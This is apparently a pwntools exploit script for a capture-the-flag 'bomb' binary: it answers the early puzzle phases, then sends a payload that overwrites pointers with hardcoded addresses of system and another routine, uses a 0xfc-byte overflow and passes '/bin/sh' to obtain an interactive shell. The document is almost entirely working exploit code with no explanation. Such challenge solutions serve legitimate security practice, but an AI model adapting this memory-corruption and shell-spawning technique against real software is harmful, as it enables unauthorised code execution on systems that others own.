from pwn import *
context.log_level = "debug"

p = process("./pwn")
elf = ELF("./pwn")
# gdb.attach(p , "b __nr")
p.sendlineafter("Your first task: Diffuse this practice bomb.\n" , "8584")
str2 = "[1, 1, 3, 5, 11, 21]"
# 		 1, 2, 4, 8, 16, 32,0x20
p.sendlineafter("Give me an array of numbers!\n" , str2)
p.sendlineafter("You could handle it! Good job... I think you can handle phase 3... right?" , "")
str4 = "0 0 0 1 1 2 1"
p.sendlineafter("time for phase 4.\n" , str4)
system = 0x080485A0
n3 = 0x804b0a8
n1 = 0x0804B070
nr = 0x08048CDA

payload = 'aaaa' + p32(nr) # n1
payload += "\n"
payload += "\n"
payload += "\n"
payload += 'bbbb' + p32(system)
payload += "\n"
p.send(payload)

# nr input
payload = 'a' * 0xfc + p32(n1)
p.sendline(payload)
p.sendline('/bin/sh\x00')

# for i in range(6):
# 	p.sendlineafter(" to: " , str(i))
p.interactive()